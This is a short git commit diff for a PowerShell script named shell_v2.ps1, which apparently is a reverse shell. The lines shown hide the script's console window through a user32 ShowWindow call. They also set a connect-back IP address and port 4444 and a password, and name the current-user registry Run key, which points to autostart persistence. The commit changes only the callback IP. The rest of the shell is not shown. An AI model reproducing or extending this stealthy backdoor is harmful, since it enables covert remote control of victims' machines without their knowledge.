3f03a7ce1b94490799ec08cac7fef7c84a0b881e
B15cu1t <141248562+B15cu1t@users.noreply.github.com>
2026-03-23 18:43:12 +0100

    Update shell_v2.ps1

--- shell_v2.ps1
+++ shell_v2.ps1
@@ -5,7 +5,7 @@ $code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h
 $win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
 $win32::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-$ip = '172.20.10.3'
+$ip = '192.168.12.204'
 $port = 4444
 $pass = "biskviti"
 $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
